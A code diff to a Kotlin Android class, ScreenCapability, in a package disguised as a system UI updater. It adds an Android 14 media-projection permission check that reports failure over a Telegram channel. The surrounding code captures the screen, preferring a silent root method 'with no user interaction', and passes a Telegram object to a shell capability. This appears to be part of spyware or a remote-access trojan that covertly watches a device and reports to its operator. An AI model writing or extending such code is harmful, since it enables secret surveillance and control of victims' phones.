@@ -1,7 +1,9 @@
 package com.android.systemui.updater.capabilities
 
+import android.Manifest
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
@@ -44,9 +46,19 @@ class ScreenCapability(
     private val captureLock = ReentrantLock()
 
     fun capture() {
+        // Check FOREGROUND_SERVICE_MEDIA_PROJECTION on Android 14+ (API 34+)
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION) 
+                != PackageManager.PERMISSION_GRANTED) {
+                telegram.sendText("❌ Media projection permission denied. Grant in Settings.")
+                return
+            }
+        }
+        
         captureLock.lock()
         try {
             val outputFile = File(ctx.cacheDir, "screen_${System.currentTimeMillis()}.png")
+            // ... rest unchanged
 
             // Try root method first (silent, no user interaction)
             val shell = ShellCapability(ctx, telegram)
